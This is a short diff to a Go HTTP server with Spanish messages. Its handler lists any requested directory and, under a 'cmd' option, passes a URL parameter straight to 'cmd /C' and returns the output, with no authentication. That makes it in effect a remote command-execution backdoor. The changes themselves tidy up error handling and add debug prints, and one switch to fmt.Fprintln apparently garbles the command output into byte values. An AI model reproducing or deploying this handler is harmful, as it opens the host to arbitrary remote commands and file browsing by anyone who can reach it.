@@ -42,6 +42,7 @@ func listRout(rutaActual string) string {
 	dir, err := os.Open(rutaActual)
 	if err != nil {
 		fmt.Println("Error al abrir el directorio:", err)
+		toReturn = err.Error()
 		return toReturn
 	}
 	defer dir.Close()
@@ -50,6 +51,7 @@ func listRout(rutaActual string) string {
 	elementos, err := dir.ReadDir(0)
 	if err != nil {
 		fmt.Println("Error al leer el directorio:", err)
+		toReturn = err.Error()
 		return toReturn
 	}
 
@@ -65,14 +67,21 @@ func listRout(rutaActual string) string {
 
 func mainHandler(response http.ResponseWriter, request *http.Request) {
 
+	if request.RequestURI == "/favicon.ico" {
+		return
+	}
+
 	fmt.Println("===================== request:\n", request, "\n\n=====================")
 
+	fmt.Println(request.RequestURI)
 	pathParms := strings.Split(strings.Split(request.RequestURI, "?")[1], "&")
+	option := pathParms[0]
+	fmt.Println("choosed option: ", option)
 
-	switch strings.Split(pathParms[0], "=")[0] {
+	switch option {
 	case "dir":
 		ls := listRout(pathParms[1])
-		response.Write([]byte(ls))
+		fmt.Fprintln(response, ls)
 		break
 	case "getBase":
 		data := struct {
@@ -93,7 +102,7 @@ func mainHandler(response http.ResponseWriter, request *http.Request) {
 	case "cmd":
 		cmd := exec.Command("cmd", "/C", pathParms[1])
 		output, _ := cmd.CombinedOutput()
-		response.Write([]byte(output))
+		fmt.Fprintln(response, output)
 		break
 	}
 }
